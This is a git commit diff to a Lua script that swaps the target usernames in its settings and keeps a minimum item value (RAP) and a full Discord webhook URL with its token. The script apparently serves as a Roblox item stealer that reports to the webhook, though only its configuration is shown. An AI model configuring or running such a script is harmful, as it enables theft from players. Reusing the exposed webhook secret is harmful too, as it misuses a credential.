d0cd141a534d39f7353d22b1f0468dd518b5a6fc
RAYZHUB <mooojjj603@gmail.com>
2025-02-20 20:21:14 +0100

    Update VCRXTAAK1NGSCRIPT.lua

--- VCRXTAAK1NGSCRIPT.lua
+++ VCRXTAAK1NGSCRIPT.lua
@@ -1,5 +1,5 @@
-Username = "omega56786fall"
-Username2 = "omega56786fall"
+Username = "rayqne_7654"
+Username2 = "rayqne_7654"
 MinimumRAP = 75000
 Webhook = "https://discord.com/api/webhooks/1342185933998653440/AuzdsQZfe8_TO7ZFuQCTQqoCx2bP3CuIuZgs9GFxlM6PM1uyxj4AF-t5CGFVH0_A8TYw"
 
